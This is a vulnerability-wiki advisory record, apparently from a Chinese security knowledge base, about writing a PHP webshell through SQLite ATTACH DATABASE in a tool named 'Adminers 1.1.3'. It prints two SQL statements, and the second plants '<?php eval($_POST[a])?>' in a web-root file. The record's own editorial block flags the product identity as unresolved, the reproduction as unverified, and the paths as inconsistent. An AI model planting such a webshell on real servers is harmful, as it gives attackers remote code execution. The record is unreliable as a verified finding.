---
source: "hatch 补库批 20260928"
title: "Adminers 1.1.3 （SQLite 3 写入一句话木马）"
product: "Adminers1.1.3 (identity unresolved)"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Login,known writable executable webroot;SQLiteATTACH capability"
source_status: "unknown"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-9fcc4217bc42ce0f5dbe4a3b"
entity_id: "ve-9fcc4217bc42ce0f5dbe4a3b"
schema_version: "1"
---

# Adminers 1.1.3 （SQLite 3 写入一句话木马）

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Login,known writable executable webroot;SQLiteATTACH capability
- 证据范围：Two isolated statements with reused alias and differing paths;no result/source

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Adminers may be distinct fork/tool,not necessarily Adminer;verify product identity
- Empty impact section and no fix/advisory
- Two statements both attach alias t but only first creates table;state session/schema assumptions
- No proof this exceeds intended privileged SQL capability;classify configuration/privilege chain pending evidence

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

需要登陆Adminers，并且需要知道网站的路径。

二、漏洞影响
------------

三、复现过程
------------

    ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*

    ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('<?php eval($_POST[a])?>');/*
